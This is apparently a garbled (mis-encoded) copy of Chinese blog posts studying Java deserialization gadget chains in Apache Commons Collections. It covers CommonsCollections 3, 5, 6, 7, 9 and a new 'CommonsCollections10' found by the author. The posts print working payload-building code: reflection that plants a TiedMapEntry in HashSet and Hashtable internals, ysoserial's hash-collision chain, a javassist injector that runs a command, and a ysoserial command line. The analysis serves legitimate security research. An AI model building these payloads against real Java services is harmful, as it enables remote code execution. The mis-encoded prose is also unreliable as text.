æˆ‘ä»¬éƒ½çŸ¥é“HashSeté›†åˆé‡Œä¸ä¼šå­˜åœ¨ç›¸åŒçš„keyï¼Œé‚£ä¹ˆæ˜¯å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯ç›¸åŒçš„keyå‘¢ï¼Ÿè¿™é‡Œå°±è¦ç”¨åˆ°keyçš„hashCodeå‡½æ•°äº†ï¼Œå¦‚æœkeyçš„å€¼ç›¸åŒï¼Œå…¶hashCodeè¿”å›çš„å€¼ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚è¿™é‡Œçš„HashCodeçš„è®¡ç®—åœ¨HashSetçš„putå’Œaddå‡½æ•°å®Œæˆï¼Œå¹¶ä¸”HashSetä»åºåˆ—åŒ–æ•°æ®ä¸­è¿˜åŸå‡ºæ¥æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨putå‡½æ•°ï¼Œè¿™é‡Œå°±ç»™æˆ‘ä»¬æä¾›äº†å¯æ§çš„åœ°æ–¹ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹HashSetçš„readObjectå‡½æ•° ç»§ç»­è·Ÿputå‡½æ•°ï¼Œè¿™é‡Œå…¶å®è°ƒç”¨çš„æ˜¯HashMapçš„putå‡½æ•° å…¶ä¸­å¯¹keyè°ƒç”¨çš„hash()å‡½æ•°ä¼šè°ƒç”¨key.hashCodeå‡½æ•°ï¼Œé‚£ä¹ˆç°åœ¨å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬åªè¦å°†keyçš„å€¼æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå¯¹è±¡å°±å¯ä»¥äº†ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„keyå€¼å…¶å®å°±æ˜¯HashSet.addçš„å®ä¾‹ï¼Œåœ¨HashSeté‡Œçš„HashMapç±»å±æ€§åªç”¨åˆ°äº†Keyã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 123456HashSet.readObject() -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 4. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7CommonsCollections7ç”¨äº†Hashtableæ¥ä»£æ›¿AnnotationInvocationHandlerï¼Œä¸åŒäºå‰é¢ä¸¤ç§CommonsCollections7å¹¶æœªä½¿ç”¨TiredMapEntryï¼Œè€Œæ˜¯ç”¨äº†ç›¸åŒkeyå†²çªçš„æ–¹å¼è°ƒç”¨equalsæ¥è§¦å‘Lazy.getå‡½æ•°ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹Hashtableçš„readObjectå‡½æ•° ç»§ç»­è·Ÿè¿›reconstitutionPut è¯¥å‡½æ•°å°†å¡«å……tableçš„å†…å®¹ï¼Œå…¶ä¸­ç¬¬1236è¡Œä»…å½“æœ‰é‡å¤æ•°æ®å†²çªæ—¶ï¼Œæ‰ä¼šè¿›å…¥ä¸‹é¢çš„ifè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›equalså‡½æ•° è¿™é‡Œçš„equalså‡½æ•°å–å†³äºkeyçš„å¯¹è±¡ï¼Œåˆ©ç”¨é“¾ç”¨çš„æ˜¯LazyMapå¯¹è±¡ï¼Œå®é™…è°ƒç”¨çš„æ˜¯çˆ¶ç±»AbstractMapDecoratorçš„equalså‡½æ•° è¿™é‡Œåˆè°ƒç”¨äº†mapçš„equalså‡½æ•°ï¼Œè¿™é‡Œå®é™…è°ƒç”¨çš„æ˜¯HashMapçš„çˆ¶ç±»AbstractMapçš„equalså‡½æ•° åœ¨ç¬¬495è¡Œè°ƒç”¨äº†m.getå‡½æ•°ï¼Œæ‰€ä»¥åé¢åˆæ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„LazyMap.getçš„å¥—è·¯äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 123456Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals -&gt; m.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 5. åˆ©ç”¨é“¾æ„é€ CommonsCollections6å’Œ7çš„expæ„é€ æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œå•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ã€‚ CommonsCollections6ç»è¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“CommonsCollections6éœ€è¦å°†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹æ·»åŠ åˆ°HashSetçš„å€¼ä¸Šã€‚ ç®€å•çš„æ–¹æ³•å°±æ˜¯ç›´æ¥add 123TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");HashSet map = new HashSet(1);map.add(entry); å¤æ‚ä¸€ç‚¹ï¼Œå°±æ˜¯ysoserailé‡Œçš„å®ç°æ–¹æ³•ï¼Œé‡‡ç”¨åå°„æœºåˆ¶æ¥å®Œæˆ å…¶æ€è·¯ä¸»è¦ä¸ºï¼š å®ä¾‹åŒ–ä¸€ä¸ªHashSetå®ä¾‹ é€šè¿‡åå°„æœºåˆ¶è·å–HashSetçš„mapç±»å±æ€§ é€šè¿‡åå°„æœºåˆ¶è·å–HashMap(mapç±»å±æ€§)çš„table(Node&lt;K,V&gt;)ç±»å±æ€§ é€šè¿‡åå°„æœºåˆ¶è·å–Nodeçš„keyç±»å±æ€§ï¼Œå¹¶è®¾ç½®è¯¥keyçš„å€¼ä¸ºæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ å…·ä½“ä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334HashSet map = new HashSet(1);map.add(\"foo\");Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");//è·å–HashSetçš„map Fieldå¯¹è±¡&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Permit.setAccessible(f);// è®¾ç½®mapå¯è¢«è®¿é—®ä¿®æ”¹HashMap innimpl = null;innimpl = (HashMap) f.get(map);// è·å–mapå®ä¾‹çš„mapç±»å±æ€§Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");// è·å–HashMapçš„ table field&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Permit.setAccessible(f2);// è®¾ç½®HashMapçš„field å¯è¢«è®¿é—®Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];// è·å–Node&lt;k,v&gt;å®ä¾‹if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");// è·å–Nodeçš„key field&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Permit.setAccessible(keyField);// è®¾ç½®è¯¥Fieldå¯è¢«è®¿é—®ä¿®æ”¹keyField.set(node, entry);// å¯¹nodeå®ä¾‹å¡«å……keyçš„å€¼ä¸ºTiedMapEntryå®ä¾‹ ç»è¿‡ä¸Šé¢çš„æ“ä½œï¼Œæœ€ç»ˆçš„HashSetå®ä¾‹è¢«æˆ‘ä»¬åµŒå…¥äº†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹ã€‚ è¿™é‡Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ç”¨ysoserailçš„Reflectionsæ¥ç®€åŒ–expï¼Œå‡ºæ¥çš„ç»“æœæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè¿˜æ²¡æœ‰æ‰¾åˆ°å…·ä½“çš„åŸå› ã€‚å¦‚æœæœ‰å¸ˆå‚…é‡åˆ°è¿‡è¿™ç§é—®é¢˜ï¼Œæ¬¢è¿ä¸€èµ·è®¨è®ºè®¨è®ºï¼ CommonsCollections7CommonsCollectionsåˆ©ç”¨çš„æ˜¯keyçš„hashå†²çªçš„æ–¹æ³•æ¥è§¦å‘equalså‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨LazyMap.getå‡½æ•° é‚£ä¹ˆæ„é€ expçš„å…³é”®å°±æ˜¯æ„é€ ä¸€ä¸ªhashå†²çªçš„LazyMapäº†ã€‚ è¿™é‡Œå¤§å®¶å¯ä»¥è·Ÿä¸€ä¸‹String.hashCodeå‡½æ•°ï¼Œä»–çš„è®¡ç®—æ–¹æ³•å­˜åœ¨ä¸åŒå­—ç¬¦ä¸²ç›¸åŒhashçš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç  CommonsCollections7ç”¨çš„å°±æ˜¯è¿™ä¸ªbugæ¥åˆ¶é€ hashå†²çªã€‚ è¿™é‡Œéœ€è¦æä¸€ç‚¹çš„æ˜¯è§¦å‘LazyMap.getå‡½æ•° è¦èµ°åˆ°ç¬¬151è¡Œçº¢æ¡†æ¡†ä¸Šï¼Œé¦–å…ˆéœ€è¦æ»¡è¶³çš„æ˜¯mapé‡Œä¸å­˜åœ¨å½“å‰è¿™ä¸ªkey ä½†æ˜¯æ˜æ˜¾åœ¨ç¬¬ä¸€æ¬¡ä¸å­˜åœ¨è¿™ä¸ªkeyåï¼Œä¼šæ›´æ–°mapçš„é”®å€¼ï¼Œè¿™å°†å¯¼è‡´ä¸‹æ¬¡åŒæ ·çš„keyè¿›æ¥ï¼Œå°±ä¸ä¼šè§¦å‘åç»­çš„payloadäº†ã€‚æˆ‘ä»¬åœ¨å†™expçš„æ—¶å€™éœ€è¦æ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚ æ¥çœ‹ä¸€ä¸‹ysoserialçš„CommonsCollections7æ˜¯æ€ä¹ˆç¼–å†™çš„ï¼ 123456789101112131415161718Map innerMap1 = new HashMap();Map innerMap2 = new HashMap();// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObjectMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);lazyMap1.put(\"yy\", 1);Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);lazyMap2.put(\"zZ\", 1);// Use the colliding Maps as keys in HashtableHashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 2);Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);// Needed to ensure hash collision after previous manipulationslazyMap2.remove(\"yy\"); å…¶ä¸­ç¬¬ä¸¤æ¬¡çš„putä¼šä½¿å¾—ä¼šä½¿å¾—LazyMap2ä¸­å¢åŠ äº†yyè¿™ä¸ªé”®å€¼ï¼Œä¸ºäº†ä¿è¯ååºåˆ—åŒ–åä»ç„¶å¯ä»¥è§¦å‘åç»­çš„åˆ©ç”¨é“¾ï¼Œè¿™é‡Œéœ€è¦å°†lazyMap2çš„yyé”®å€¼removeæ‰ã€‚ 6. æ„é€ æ–°CommonsCollections10ç»è¿‡å¯¹å‰é¢1,3,5,6,7çš„åˆ†æï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥å‘ç°å¾ˆå¤špayloadéƒ½æ˜¯â€œæ‚äº¤â€çš„æˆæœã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦èƒ½æ ¹æ®å‰é¢çš„åˆ†æï¼Œæ„é€ å‡ºä¸€ä¸ªæ–°çš„CommonsCollectionsçš„payloadå‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼Œæ¥ä¸‹æ¥è®²ä¸€ä¸‹æˆ‘æ‰¾åˆ°çš„ä¸€ä¸ªæ–°payloadåˆ©ç”¨ã€‚ è¿™ä¸ªpayloadä¸ºCommonsCollections6å’Œ7çš„ç»“åˆï¼ŒåŒCommonsCollections6ç±»ä¼¼ï¼Œè¿™é‡Œä¹Ÿç”¨åˆ°äº†TiedMapEntryçš„hashCodeå‡½æ•° æˆ‘ä»¬åœ¨åˆ†æHashtableçš„reconstitutionPutå‡½æ•°æ—¶ï¼Œçœ‹ä¸‹å›¾ è¯¥å‡½æ•°åœ¨ç¬¬1234è¡Œå¯¹keyè°ƒç”¨äº†ä¸€æ¬¡hashCodeå‡½æ•°ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œå¦‚æœkeyå€¼è¢«ä»£æ›¿ä¸ºæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°±èƒ½è§¦å‘LazyMap.getå‡½æ•°ï¼Œåç»­çš„è°ƒç”¨é“¾å°±ç±»ä¼¼äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 1234567Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() å…¶å®ä»åˆ©ç”¨é“¾æ¥çœ‹ï¼Œä¸CommonsCollections6çš„åŒºåˆ«åœ¨äºå‰éƒ¨çš„è§¦å‘ä½¿ç”¨äº†ä¸åŒçš„å¯¹è±¡ã€‚ æ¥ä¸‹æ¥ï¼Œç»“åˆç¬¬5ç‚¹çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æ¥å†™ä¸€ä¸‹è¿™ä¸ªpayloadçš„åˆ©ç”¨é“¾exp 12345678910111213141516171819202122232425final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);final Map innerMap = new HashMap();final Map innerMap2 = new HashMap();final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");Hashtable hashtable = new Hashtable();hashtable.put(\"foo\",1);// è·å–hashtableçš„tableç±»å±æ€§Field tableField = Hashtable.class.getDeclaredField(\"table\");Permit.setAccessible(tableField);Object[] table = (Object[])tableField.get(hashtable);Object entry1 = table[0];if(entry1==null) entry1 = table[1];// è·å–Hashtable.Entryçš„keyå±æ€§Field keyField = entry1.getClass().getDeclaredField(\"key\");Permit.setAccessible(keyField);// å°†keyå±æ€§ç»™æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå®ä¾‹keyField.set(entry1, entry);// å¡«å……çœŸæ­£çš„å‘½ä»¤æ‰§è¡Œä»£ç Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);return hashtable; 7. æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9æ‰¾åˆ°ä¸Šé¢CommonsCollections10æ—¶ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æœ‰æ²¡æœ‰å¸ˆå‚…å·²ç»æŒ–åˆ°è¿‡äº†ï¼Œä¸€å…±æ‰¾åˆ°ä¸‹é¢ä¸‰ä½å¸ˆå‚… https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d https://github.com/frohoff/ysoserial/pull/116 ä¸€ä¸ªä¸€ä¸ªæ¥è¯´ ç¬¬ä¸€ä¸ªJayl1nå¸ˆå‚…åšçš„æ”¹å˜ä¸»è¦æ˜¯æœ€ç»ˆçš„Runtime.getRuntime().execæ”¹æˆäº†URLClassLoader.loadClass().newInstanceçš„æ–¹å¼ï¼Œå‰é¢ç”¨çš„è¿˜æ˜¯CommonsCollections6ï¼Œè¿™é‡Œæš‚æ—¶ä¸å°†å…¶å½’ç±»ä¸ºæ–°çš„åˆ©ç”¨é“¾ã€‚ ç¬¬äºŒä¸ªæ˜¯æ¢…å­é…’å¸ˆå‚…æäº¤çš„CommonsCollections9ï¼Œä¸»è¦åˆ©ç”¨çš„æ˜¯CommonsCollections:3.2ç‰ˆæœ¬æ–°å¢çš„DefaultedMapæ¥ä»£æ›¿LazyMapï¼Œå› ä¸ºè¿™ä¸¤ä¸ªMapæœ‰åŒæ ·çš„getå‡½æ•°å¯ä»¥è¢«åˆ©ç”¨ï¼Œè¿™é‡Œä¸å†å…·ä½“åˆ†æã€‚ ç¬¬ä¸‰ä¸ªæ˜¯navalorenzoå¸ˆå‚…æäº¤çš„CommonsCollections8ï¼Œå…¶åˆ©ç”¨é“¾åŸºäºCommonsCollections:4.0ç‰ˆæœ¬ï¼Œæš‚æ—¶ä¸åœ¨æœ¬ç¯‡æ–‡ç« çš„åˆ†æèŒƒå›´å†…ï¼Œåé¢ä¼šå¥½å¥½åˆ†æä¸€ä¸‹ã€‚ 0x03 æ€»ç»“è”åˆå‰é¢ä¸¤ç¯‡æ–‡ç« CommonsCollections1ã€CommonsCollections3ï¼Œåœ¨åŠ ä¸Šæœ¬æ–‡çš„CommonsCollections5ï¼Œ6ï¼Œ7ï¼Œ9ï¼Œ10ã€‚ ç”±äºç½‘ä¸Šå·²ç»æœ‰ç±»ä¼¼çš„æ–‡ç« åšäº†æ€»ç»“ï¼Œè¿™é‡Œå°±ç®€å•åšä¸€ä¸‹CommonsCollections&lt;=3.2.1ä¸‹çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ€»ç»“ã€‚ èµ·å§‹ç‚¹ AnnotationInvocationHandlerçš„readObject BadAttributeValueExpExceptionçš„readObject HashSetçš„readObject Hashtableçš„readObject é‡è¦çš„æ‰¿æ¥ç‚¹ LazyMapçš„get DefaultedMapçš„get TiedMapEntryçš„getValue Proxyçš„invoke ç»ˆç‚¹ ChainedTransformerçš„transform InvokerTransformerçš„transform ConstantTransformerçš„transform å„expçš„jdké€‚ç”¨ç‰ˆæœ¬ jdk7 =&gt; CommonsCollection1ã€3 jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10 å„expçš„commons-collectionsé€‚ç”¨ç‰ˆæœ¬ commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10 commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10 æœ€åçš„æœ€åï¼Œcommons-collections:3.xç‰ˆæœ¬çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾å°±åˆ†æåˆ°è¿™é‡Œï¼Œå…¶å®æˆ‘ç›¸ä¿¡å¦‚æœæƒ³ç»§ç»­æŒ–å¯ä»£æ›¿çš„åˆ©ç”¨é“¾è¿˜æ˜¯ä¼šæœ‰çš„ï¼Œå°±åƒæœ¬æ–‡æŒ–åˆ°çš„CommonsCollections10ï¼Œå¦‚æœå„ä½å¸ˆå‚…æœ‰å…´è¶£å¯ä»¥ç»§ç»­æŒ–ä¸‹å»ï¼Œä¹Ÿæ¬¢è¿å’Œå„ä½å¸ˆå‚…ä¸€èµ·äº¤æµã€‚ åç»­è¿˜ä¼šæŠŠcommons-collections:4ç‰ˆæœ¬çš„åˆ©ç”¨é“¾åšä¸€ä¸ªåˆ†æï¼Œæ¬¢è¿ä¸€èµ·äº¤æµï¼šï¼‰"},{"title":"ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections3","permalink":"http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3-3/","text":"0x00 å‰è¨€å‰é¢åˆ†æäº†ysoserialçš„CommonsCollections1ï¼Œç†Ÿæ‚‰äº†ä¸€ç‚¹Javaååºåˆ—åŒ–ã€‚æœ¬æ–‡å°†ç»§ç»­åˆ†æysoserialçš„åˆ©ç”¨ï¼Œä»Šå¤©çš„ä¸»è§’æ˜¯CommonsCollections3. 0x01 ç¯å¢ƒå‡†å¤‡é¦–å…ˆç”±äºoverrideçš„åŸå› ï¼Œç¯å¢ƒä½¿ç”¨çš„æ˜¯jdk7u80ã€‚åˆ©ç”¨ysoserialç”Ÿæˆpayloadï¼Œå¹¶è½½å…¥è°ƒè¯•ã€‚ 1java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 \"open /System/Applications/Calculator.app\" &gt; commonscollections3.ser 0x02 åŸºç¡€çŸ¥è¯†åœ¨åˆ†æå¼€å§‹å‰ï¼Œå…ˆè¡¥å……ä¸€ä¸‹åŸºç¡€çŸ¥è¯† 12public class StaticBlockTest &#123;&#125; 12345678910111213141516171819202122public class Cracker &#123; public static byte[] generate()&#123; try &#123; String code = \"&#123;java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");&#125;\"; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(StaticBlockTest.class.getName()); clazz.setName(\"demo\"); clazz.makeClassInitializer().insertAfter(code); return clazz.toBytecode(); // ... &#125; public static void main(String[] args) &#123; byte[] clazz = generate(); DefiningClassLoader loader = new DefiningClassLoader(); Class cls = loader.defineClass(\"demo\",clazz);// ä»å­—èŠ‚æ•°ç»„ä¸­æ¢å¤ç±» try &#123; cls.newInstance(); // å®ä¾‹åŒ–è¯¥ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨é™æ€å—å†…çš„ä»£ç  &#125; // ... &#125;&#125; é€šè¿‡ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—çš„çŸ¥è¯†ç‚¹ä¸»è¦ä¸ºä¸¤ç‚¹ï¼š â€‹ a. defineClasså¯ä»¥ä»byteæ•°ç»„ä¸­æ¢å¤ä¸€ä¸ªClass â€‹ b. static initializeråœ¨ç±»å®ä¾‹åŒ–æ—¶å°†è‡ªåŠ¨æ‰§è¡Œï¼ˆé™æ€å—å†…çš„ä»£ç ï¼‰ Javaä¸­åŠ¨æ€è°ƒç”¨çš„å¦ä¸€ç§æ–¹å¼æ˜¯defineClass Javaæä¾›äº†ClassLoaderä»bytesæ•°ç»„ä¸­è¿˜åŸClassçš„æ–¹æ³•ï¼ŒdefineClasså‡½æ•°å°±æ˜¯å®Œæˆè¿™ä¸€è¿‡ç¨‹çš„å‡½æ•°ã€‚ ç†è®ºä¸Šï¼Œå¦‚æœä»£ç ä¸­ä½¿ç”¨äº†è¿™ç§æ–¹å¼ï¼Œä¸”byteæ•°æ®çš„å†…å®¹å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„Javaä»£ç ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ è¿™é‡Œå°±ç”¨åˆ°äº†Javaç±»çš„å¦ä¸€ä¸ªç‰¹æ€§ï¼Œstatic blockåœ¨ç±»å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œå—å†…çš„ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡javassistå¯¹é™æ€å—æ³¨å…¥ä»»æ„ä»£ç ï¼Œè¯¥ç±»è¢«æ¢å¤å¹¶å®ä¾‹åŒ–æ—¶å°±ä¼šè°ƒç”¨æ³¨å…¥çš„ä»£ç ï¼Œåæ–‡çš„åˆ©ç”¨é“¾ä¸»è¦å°±æ˜¯ç”¨åˆ°äº†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚ 0x03 åˆ©ç”¨é“¾åˆ†æ1. å‰æ™¯å›é¡¾è¿™é‡Œé€‰æ‹©CommonsCollections3æ˜¯å› ä¸ºä»–çš„å‰åŠæ®µè§¦å‘çš„åˆ©ç”¨é“¾è·ŸCommonsCollections1æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦åˆ†æååŠæ®µå‘½ä»¤æ‰§è¡Œçš„æ„é€ å³å¯ã€‚å›é¡¾ä¸€ä¸‹å‰åŠæ®µåˆ©ç”¨é“¾ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; iTransformers[].transform() CommonsCollections1ä¸­ChainedTransformer.transform()ä¼šå¾ªç¯è°ƒç”¨iTransformersæ•°ç»„é‡Œçš„å¯¹è±¡çš„transformå‡½æ•°ã€‚CommonsCollections1ç”¨çš„æ˜¯InvokerTransformerçš„transformï¼Œå› ä¸ºè¯¥å‡½æ•°å®ç°äº†åå°„è°ƒç”¨ä»»æ„ç±»çš„åŠŸèƒ½ã€‚é‚£ä¹ˆé™¤äº†ä½¿ç”¨InvokerTransformerè¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„æ–¹æ³•ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼ 2. æ–°çš„å‘½ä»¤æ‰§è¡Œåˆ©ç”¨é“¾æ¥çœ‹ä¸€ä¸‹CommonsCollections3çš„payloadsæ„é€  123456789Object templatesImpl = Gadgets.createTemplatesImpl(command);// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] &#123; Templates.class &#125;, new Object[] &#123; templatesImpl &#125; )&#125;;// åç»­ç±»ä¼¼ çœç•¥ ConstantTransformerä¸Šä¸€ç¯‡å·²ç»è¯´è¿‡äº†ï¼Œå…¶transformä¼šè¿”å›æ„é€ æ—¶çš„å¯¹è±¡ï¼Œè¿™é‡Œå°±æ˜¯TrAXFilter.classå¯¹è±¡ã€‚ æˆ‘ä»¬é‡ç‚¹æ¥çœ‹InstaniateTransformerçš„transformå‡½æ•° ç®€å•æ¥çœ‹ï¼Œè¯¥å‡½æ•°å¯¹è¾“å…¥çš„inputï¼ˆè¿™é‡Œå°±æ˜¯TrAXFilter.classï¼‰åšå®ä¾‹åŒ–çš„æ“ä½œã€‚è¿™é‡Œçœ‹èµ·æ¥ï¼Œå…¶å®æœ‰ç‚¹åƒphpä¸­æ‰¾å¯¹åº”çš„__constructsï¼Œåœ¨Javaé‡Œæˆ‘ä»¬å°±å»æ‰¾æ„é€ å‡½æ•°é‡Œåšäº†å±é™©æ“ä½œçš„classã€‚ æ¥çœ‹ä¸€ä¸‹TrAXFilterç±»çš„æ„é€ å‡½æ•° è¿™é‡Œçš„templateså°±æ˜¯ä¸Šé¢expä¸­æ„é€ çš„templatesImpl. ç»§ç»­çœ‹TransformerImplçš„newTransformerå‡½æ•° org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481 ç»§ç»­çœ‹getTransletInstance å†ç»§ç»­defineTransletClasses çœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œæ²¡é”™ï¼Œè¿™é‡Œç”¨åˆ°äº†0x02ä¸­çš„ä¸¤ä¸ªåŸºç¡€çŸ¥è¯†ã€‚defineTransletClassesè¿˜åŸå‡ºç±»ï¼ŒgetTransletInstanceè¿›è¡Œå®ä¾‹åŒ–ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªåˆé€‚çš„_bytecodeså³å¯æ‰§è¡Œä»»æ„Javaä»£ç ã€‚ ä¸‹é¢è¡¥å……ä¸€ä¸‹ï¼Œåœ¨æ„é€ expæ—¶éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š æ¤å…¥çš„templatesä¸ºTransformerImplç±»ï¼Œä»è€Œè°ƒç”¨åç»­çš„newTransformerå‡½æ•° æ¤å…¥çš„templateså®ä¾‹ï¼Œ_nameä¸ä¸ºnull,_classä¸ºnull æ¤å…¥çš„templateså®ä¾‹ï¼Œ_bytecodesä¸ä¸ºnull,_tfactoryä¸ºTransformerFactoryImplå¯¹è±¡ æ¤å…¥çš„templates._bytecodesæ•°ç»„ï¼Œå…¶æœ€ç»ˆè¿˜åŸçš„å¯¹è±¡çˆ¶ç±»ä¸ºcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet é‚£ä¹ˆæ€ä¹ˆæ‰èƒ½æ»¡è¶³è¿™äº›æ¡ä»¶å‘¢ï¼Ÿè¿™é‡Œç¥å¥‡çš„javassiståˆè¦ä¸Šåœºå•¦ï¼ æ¥çœ‹ä¸€ä¸‹ysoserialçš„æ“ä½œ ä¸Šé¢çš„ä»£ç ä¸åšçœç•¥ï¼Œæˆ‘ä»¬åº”è¯¥å¥½å¥½å­¦ä¹ ä¸€ä¸‹javassistçš„åŸºæœ¬æ“ä½œï¼Œä»£ç å¯ä»¥åœ¨Gadgets.createTemplatesImplæ‰¾åˆ°ï¼ è¿™é‡Œæ¡†äº†ä¸¤ä¸ªæ¡†ï¼Œç¬¬ä¸€ä¸ªæ¡†æ˜¯é€šè¿‡javassistæ³¨å…¥é™æ€å—ï¼Œé™æ€å—çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ç¬¬äºŒä¸ªæ¡†æ˜¯ysoserailæ¡†æ¶è‡ªå·±å°è£…çš„ä¸€ä¸ªåå°„å·¥å…·ç±»ï¼Œé€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥åŠ¨æ€çš„æ“ä½œtemplateså®ä¾‹çš„ç±»å±æ€§å†…å®¹ã€‚è¿™é‡Œä¸»è¦å°±æ˜¯åœ¨æ»¡è¶³ä¸Šè¿°çš„å‡ ä¸ªæ¡ä»¶ã€‚ 